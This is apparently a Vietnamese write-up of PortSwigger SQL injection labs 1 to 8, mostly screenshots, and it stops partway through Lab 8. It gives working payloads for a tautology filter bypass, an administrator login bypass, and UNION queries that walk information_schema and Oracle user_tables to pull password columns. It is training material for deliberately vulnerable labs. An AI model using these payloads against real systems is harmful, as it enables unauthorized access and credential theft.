<img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/6d1f6a74-d046-4136-a185-68dd872c0584" /># Write-up-All-labs-SQL-injection-PortSwigger


# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<img width="1138" height="852" alt="image" src="https://github.com/user-attachments/assets/4e981c41-e3c1-4f0c-a021-de12a3947de4" />

Theo hint ở đầu bảo tồn tại lỗ hổng tấn công SQL injection trong bộ lọc danh mục sản phẩm. Khi chọn một danh mục thì câu truy vấn sẽ chạy là

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Ở đây mình chọn thử mục Pets

<img width="1468" height="942" alt="image" src="https://github.com/user-attachments/assets/0ea45432-ff60-4564-b5cf-78c9b93a7c08" />

Và `Pets` được sử dụng để truyền vào tham số `Category` ở trên thanh URL 

Thử sửa input truyền vào thành `Pets'or 1=1--` 

<img width="1491" height="819" alt="image" src="https://github.com/user-attachments/assets/a0a080f8-b777-40ba-a0b7-a91a7f471592" />

Chúng ta Solve được Challenge này 

# Lab 2: SQL injection vulnerability allowing login bypass

<img width="1132" height="682" alt="image" src="https://github.com/user-attachments/assets/ab65d35a-1013-43be-8157-85a23f8d6676" />

Chúng ta  SQL Injection ở chức năng đăng nhập để có thể log in với `username:administrator`

Thử với đăng nhập với `username:` `administrator'--` và password nhập gì cũng được

<img width="890" height="414" alt="image" src="https://github.com/user-attachments/assets/951ea563-cf22-4b8d-a65f-b5464941a41c" />

Và kết quả là:

<img width="1439" height="703" alt="image" src="https://github.com/user-attachments/assets/9a691600-9f28-4b25-b954-5f9290982e07" />

Chúng ta Solve được Challenge này 

# Lab 3: SQL injection attack, querying the database type and version on Oracle

<img width="1134" height="824" alt="image" src="https://github.com/user-attachments/assets/f2a93e3d-b4b8-4fdf-b09b-4c647ce8f7f1" />

Đề bài mô tả: tồn tại lỗ hổng trong bộ lọc danh mục sản phẩm, sử dụng UNION để khai thác lấy ra version database -> solved

Thử chọn mục Pets

<img width="1469" height="974" alt="image" src="https://github.com/user-attachments/assets/c5f2e908-09a1-49b9-a30e-200a0f45da0a" />

Đầu tiên xác định số lượng cột của câu SELECT phía trước bằng `ORDER BY` hoặc bằng cách thêm `SELECT NULL,NULL,NULL` cho đến khi vào server báo lỗi

<img width="1495" height="810" alt="image" src="https://github.com/user-attachments/assets/84835037-ce22-4690-bd28-fa9dfd090c47" />

<img width="1484" height="830" alt="image" src="https://github.com/user-attachments/assets/89ca87e9-fe2e-49dd-92d4-58e62984326e" />

Đến 3 nó lỗi , vậy số lượng cột ở đây là 2



<img width="1498" height="806" alt="image" src="https://github.com/user-attachments/assets/0a928411-3559-4cf9-9ba5-bd877122f064" />

Chúng ta Solve được Challenge này!

# Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

<img width="1138" height="816" alt="image" src="https://github.com/user-attachments/assets/52efe408-eee6-4201-950d-3295c34bd477" />

Chall này tương tự như Lab 3, chỉ đổi hệ quản trị cơ sở dữ liệu từ Oracle sang MySQL

<img width="1492" height="809" alt="image" src="https://github.com/user-attachments/assets/28598fe1-1089-4832-aa62-7794adff1785" />

Chúng ta Solve được Challenge này!


# Lab 5: SQL injection attack, listing the database contents on non-Oracle databases

<img width="1130" height="908" alt="image" src="https://github.com/user-attachments/assets/d58866a3-f791-4aa4-886c-d8ccbb4b2fa8" />

<img width="1496" height="540" alt="image" src="https://github.com/user-attachments/assets/3fbcb987-c158-4915-9bac-afe987ed9349" />

Chúng ta xác định được số cột bằng 2

<img width="1495" height="809" alt="image" src="https://github.com/user-attachments/assets/1d31661f-d52a-46b6-9e66-8e557c3e36b0" />

Lệnh lấy danh sách cơ sở dữ liệu trong MySQL:
```sql
SELECT schema_name FROM information_schema.schemata
```
Chúng ta thử truyền vào
```sql
'union SELECT schema_name,null FROM information_schema.schemata--
```
<img width="1485" height="812" alt="image" src="https://github.com/user-attachments/assets/df11bb73-3974-46e8-a7d3-bd6637438af3" />


Tiếp theo chúng ta cần xác định tên bảng

Lệnh lấy danh sách bảng có trong một cơ sở dữ liệu(MySQL):
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'tên_database'
```
Chúng ta thử truyền vào:
```sql
' union SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = 'public'--
```

<img width="1494" height="810" alt="image" src="https://github.com/user-attachments/assets/256dc107-b8c1-4b6d-a30c-459e16bc2670" />

Sau khi xác định được bảng thì cần xác định cột trong bảng đó:

Lệnh lấy danh sách cột có trong bảng(MySQL):
```sql
SELECT column_name FROM information_schema.columns WHERE table_schema = 'tên_database' AND table_name = 'tên_bảng';
```
Áp dụng:
```sql
' union SELECT column_name,NULL FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_yveauo'--
```

<img width="1492" height="807" alt="image" src="https://github.com/user-attachments/assets/e4190b85-b9eb-4bd1-837f-43c8927a9c6b" />

Cuối cùng truy cập vào cột  `password_skyupt` trong bảng `users_yveauo` để xem password thôi

```sql
' union select password_skyupt,null from users_yveauo--
```

<img width="1491" height="814" alt="image" src="https://github.com/user-attachments/assets/c547c721-5cfc-4846-82bb-29add2a4132a" />

Đăng nhập với username: `administrator`

<img width="920" height="502" alt="image" src="https://github.com/user-attachments/assets/00b06736-e682-4873-8a51-b326e4fd7283" />

Và chúng ta Solve được Challenge này!

<img width="1666" height="701" alt="image" src="https://github.com/user-attachments/assets/2776f54e-e21c-4b88-9834-d452828e6c09" />


# Lab 6: SQL injection attack, listing the database contents on Oracle

<img width="1136" height="909" alt="image" src="https://github.com/user-attachments/assets/16824154-28ec-4ac8-9357-2eff95d80fb7" />

Bài này tương tự với lab 5 nhưng chỉ đổi với hệ quản trị cơ sở dữ liệu ở đây là Oracle

Lưu ý: Thường Oracle = 1 database, bên trong có nhiều schema (users). Tức là mỗi khi user tạo tài khoản thì nó sẽ có những bảng riêng trong 1 database ấy chứ nó không sử dùng nhiều database như MySQL

Sơ đồ hình dung như thế này 
```
Database
 ├── Schema A (user A)
 │    ├── table1
 │    ├── table2
 │    └── view1
 ├── Schema B (user B)
 │    ├── users
 │    ├── orders
 │    └── logs
```
Cú pháp liệt kê bảng trong schema hiện tại của Oracle
```sql
SELECT table_name FROM user_tables;
```
Chúng ta nhập vào
```sql
' union select table_name,null from user_tables--
```
<img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/4b827f22-400b-4568-8816-b1abd86a0df8" />

Cú pháp liệt kê cột của bảng trong schema hiện tại
```sql
SELECT column_name, data_type
FROM user_tab_columns
WHERE table_name = 'USERS';
```
Chúng ta nhập vào 
```sql
' union select column_name,null from user_tab_columns where table_name = 'USERS_UQVEHQ' --
```
<img width="1484" height="759" alt="image" src="https://github.com/user-attachments/assets/de06516a-8da0-4e61-92e7-8c50f7c04662" />

Cuối cùng , đọc dữ liệu trong cột `PASSWORD_ICXLMV` của bảng `USERS_UQVEHQ`
```sql
' union select PASSWORD_ICXLMV,null from USERS_UQVEHQ --
```

<img width="1494" height="814" alt="image" src="https://github.com/user-attachments/assets/8500de96-cf0e-4fce-8584-e7337078bc2d" />

Dùng mật khẩu đó đăng nhập với username:`administrator`

<img width="1177" height="583" alt="image" src="https://github.com/user-attachments/assets/47fbc96d-bdf0-443f-aa86-72ed416876dd" />

Và chúng ta solve được Challenge này!

<img width="1492" height="709" alt="image" src="https://github.com/user-attachments/assets/6dfabc7e-b259-4877-982b-fffd9ea68fc7" />

# Lab 7: SQL injection UNION attack, determining the number of columns returned by the query

<img width="1126" height="631" alt="image" src="https://github.com/user-attachments/assets/489856b5-9d16-4db2-ad58-96b6167e7c72" />

Theo đề bài mô tả , để solved được thì phải sử dụng kĩ thuật `UNION SELECT NULL` để xác định số lượng cột của truy vấn `SELECT` trước đó

Chúng ta nhập vào 
```sql
' union select null,null,null--
```
<img width="1493" height="844" alt="image" src="https://github.com/user-attachments/assets/3183cadb-a536-4c78-a9e6-1d8f7ffe5c7a" />

Và chúng ta Solve được Challenge này!

# Lab 8: SQL injection UNION attack, finding a column containing text

<img width="1143" height="705" alt="image" src="https://github.com/user-attachments/assets/6b166406-39ae-47b6-9249-010a1d14110b" />

Theo mô tả của challenge này , chúng ta muốn Solve được phải xác định đúng kiểu dữ liệu chuỗi đang được cột nào ở câu Select trước đang sử dụng 

Trước tiên vẫn phải xác định số cột trước đã, bằng kỹ thuật đã học ở Lab 7

<img width="1481" height="819" alt="image" src="https://github.com/user-attachments/assets/48274c10-881c-4ba2-86dd-d1f85fb18c0c" />

Chúng ta truyền vào
```sql
' union select null,null,null--
```
Và xác định được số cột sử dụng trong câu Select trước là 3 cột

Tiếp theo dùng thử một ví dụ của cho kiểu dữ String , ở đây mình dùng `'a'` rồi thay lần lượt vào từng cột 

<img width="1488" height="627" alt="image" src="https://github.com/user-attachments/assets/5860d32a-d708-4ff0-9501-06b030c05f89" />


